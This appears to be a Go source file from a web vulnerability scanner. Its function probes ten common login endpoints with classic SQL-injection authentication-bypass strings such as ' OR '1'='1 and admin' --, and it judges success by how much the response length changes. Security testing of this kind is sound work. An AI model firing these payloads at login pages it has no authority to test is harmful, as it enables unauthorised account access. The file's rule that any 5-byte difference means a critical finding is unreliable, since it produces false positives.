package sqliengine

import (
	"DORM/models"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"strings"
)

// ============================================================
//  POST AUTH BYPASS — Login form injection + JSON body bypass
// ============================================================

// RunPostAuthBypass tests SQL injection on login forms via POST.
func RunPostAuthBypass(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	loginPages := []string{
		"/login.php", "/admin", "/admin.php", "/user/login",
		"/index.php", "/login.aspx", "/signin", "/login",
		"/api/login", "/api/auth",
	}
	postPayloads := []string{
		"' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #",
		`" OR "1"="1`, "') OR ('1'='1",
		"' OR '1'='1'/*", "admin'/*",
	}
	formParams := []string{"username", "user", "email", "login", "id", "txtUser", "txtPassword"}

	for _, page := range loginPages {
		targetEndpoint := baseURL + page

		// Baseline (invalid credentials)
		baseLen, err := getPostResponseLength(client, targetEndpoint, "invalid_user_x9", "invalid_pass_x9")
		if err != nil {
			continue
		}

		for _, payload := range postPayloads {
			for _, param := range formParams {
				_ = param
				attackLen, err := getPostResponseLength(client, targetEndpoint, payload, "123456")
				if err != nil {
					continue
				}
				diff := math.Abs(float64(attackLen - baseLen))
				if diff > 5 || (baseLen == 0 && attackLen > 500) {
					return &models.Vulnerability{
						Target:   target,
						Name:     "SQL Injection (POST/Auth Bypass)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"Login bypass detected via POST injection.\n"+
								"Endpoint: %s\nPayload: %s\nResponse Diff: %.0f bytes",
							page, payload, diff,
						),
						Solution:  "Sanitize all POST inputs and use Prepared Statements (PDO).",
						Reference: "OWASP Injection / Authentication Bypass",
					}
				}
			}
		}
	}

	return nil
}

// getPostResponseLength sends a POST request with credentials and returns body size.
func getPostResponseLength(client *http.Client, urlStr, user, pass string) (int, error) {
	data := url.Values{}
	data.Set("username", user)
	data.Set("user", user)
	data.Set("email", user)
	data.Set("login", user)
	data.Set("password", pass)
	data.Set("pass", pass)

	req, err := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode()))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "DORM-Scanner/Enterprise")

	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	body := models.ReadBody(resp, 65536)
	return len(body), nil
}
